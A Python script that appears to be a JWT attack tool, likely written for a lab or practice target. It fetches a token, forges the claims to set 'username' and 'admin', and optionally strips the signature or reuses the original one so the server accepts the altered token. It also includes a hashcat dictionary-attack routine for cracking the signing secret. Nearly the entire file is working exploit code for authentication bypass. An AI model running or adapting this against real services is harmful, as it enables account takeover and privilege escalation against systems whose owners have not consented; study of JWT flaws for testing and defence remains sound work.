import base64
from hashcat_wrapper import HashcatWrapper
import json
import jwt
import requests
import settings


class Connection:
    def __init__(self):
        self.token = ''
        self.header_text = ''
        self.payload_text = ''
        self.signature_text = ''
        self.req_headers = {}
        self.header_data = {}
        self.response_data = {}


def b64url_decode(data:str):
    data += '=' * (-len(data) % 4)  # Fix padding
    return base64.urlsafe_b64decode(data)

def get_token(token:Connection, url: str):
    # Send the request to the server to obtain token and store in token
    print(f"Getting token from: {url}\n")
    try:
        response = requests.post(url, headers=con.headers, json=con.data)
        json_string = response.text
        response_data = json.loads(json_string)
        con.token = response_data["token"]
    except Exception as e:
        print(f"Error: {e}")

def decode_token(token:Connection):
    print(f"Decoding token:\n{con.token}\n")
    header_b64, payload_b64, signature_b64 = con.token.split(".")

    # Decode Token
    header_bytes = b64url_decode(header_b64)
    payload_bytes = b64url_decode(payload_b64)
    signature_bytes = b64url_decode(signature_b64)

    token.header_text = header_bytes.decode('utf-8')
    token.payload_text = payload_bytes.decode('utf-8')
    token.signature_text = base64.b64encode(signature_bytes).decode('ascii')

def update_payload():
    """ Convert header string to json and update payload """
    json_header = json.loads(con.header_text)
    json_header["alg"] = settings.header_alg

    """ Convert payload string to json and update payload """
    json_payload = json.loads(con.payload_text)
    json_payload["username"] = settings.payload_username
    json_payload["admin"] = settings.payload_admin

    """ Convert JSON back to string and base64 encode """
    con.header_text = json.dumps(json_header).replace(' ','')
    print(f"Updated header:\n{con.header_text}\n")
    con.header_bytes = base64.b64encode(con.header_text.encode()).decode()
    con.payload_text = json.dumps(json_payload).replace(' ','')
    print(f"Updated payload:\n{con.payload_text}\n")
    con.payload_bytes = base64.b64encode(con.payload_text.encode()).decode()

    header_hb64 = con.token.split(".")[0]
    signature_hb64 = con.token.split(".")[2]
    if settings.send_sig == 0:
        con.token = f"{header_hb64}.{con.payload_bytes}."
    else:
        con.token = f"{header_hb64}.{con.payload_bytes}.{signature_hb64}"
    print(f"Updated token:\n{con.token}\n")

def verify_token(token:Connection, url: str):
    print(f"Verifying payload using {url}\n")
    if settings.update_token == 1:
        update_payload()
    headers = {
        "Authorization": f"Bearer {con.token}"
    }
    # Get token
    try:
        response = requests.get(url, headers=headers)
        json_string = response.text
        con.response_data = json.loads(json_string)
    except Exception as e:
        print(f"Error: {e}")

def hash_it(jwt_token:str):
    # Write token to temp file
    print("Trying to crack token for secret....\n")
    hc = HashcatWrapper()
    with open('token.tmp', 'w') as f:
        f.write(jwt_token)
    # Run  hashcat6 -m 16500 -a 0 temp file jwt.secrets.list
    # Dictionary attack
    result = hc.run_attack(
        hash_file="token.tmp",
        attack_mode=0,  # Straight attack
        target="jwt.secrets.list",
        hash_mode=16500,  # JWT
        additional_args=["--force"]
    )

    if result['success']:
        print("Attack completed successfully")
        return result['stdout']
    else:
        print("Attack failed:", result.get('error', result.get('stderr')))

# Get settings
url = settings.url

""" Initiate Class """
con = Connection()

""" Send Login and Get Token """
con.headers = {
    "Content-Type": "application/json"
}
con.data = {
    "username": settings.login_username,
    "password": settings.password
}
get_token(con, url)

""" Decode token values and print """
decode_token(con)
print(f"Response:")
print(f"Header: {con.header_text}")
print(f"Payload: {con.payload_text}")
print(f"Signature: {con.signature_text}\n")

""" Attempt to get secret from hash """
#secret = hash_it(token.token)
#print(f"Secret: {secret}")

""" Verify Token """
url += f"?username={settings.url_username}"
verify_token(con, url)

print(f"Output: {con.response_data}")
